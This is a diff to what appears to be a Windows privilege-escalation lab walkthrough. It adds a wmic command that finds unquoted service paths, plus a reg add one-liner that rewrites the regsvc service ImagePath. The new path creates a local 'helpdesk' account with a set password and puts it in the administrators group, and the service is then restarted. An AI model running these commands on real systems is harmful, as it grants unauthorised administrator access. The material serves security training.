@@ -427,6 +427,14 @@ The Remote Mouse application lets us open an administrator command prompt.
 
 This service has an unquoted executable path with spaces, making it vulnerable to privilege escalation. The path is:
 
+**Enumerating Unquoted Service Paths Using Manual Techniques:**
+
+```bash
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+```
+
+**We focus on:**
+
 `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
 
 **Steps:**
@@ -488,7 +496,7 @@ This service has an unquoted executable path with spaces, making it vulnerable t
 
 We can change the service's executable path in the registry.
 
-**Steps:**
+**GUI Steps:**
 
 1. **Open Registry Editor:**
 
@@ -513,6 +521,23 @@ We can change the service's executable path in the registry.
    sc stop regsvc
    sc start regsvc
    ```
+
+**CMD Steps:**
+
+1. **Modify the Registry Using a One-Liner Command:**
+   - Run the following command to change the `ImagePath` in the registry:
+
+     ```bash
+     reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "cmd.exe /c net user helpdesk L3tm3!n /add && net localgroup administrators helpdesk /add" /f
+     ```
+
+2. **Restart the `regsvc` Service:**
+   - Run the following commands to restart the service:
+
+     ```bash
+     sc stop regsvc
+     sc start regsvc
+     ```
 
 ---
 
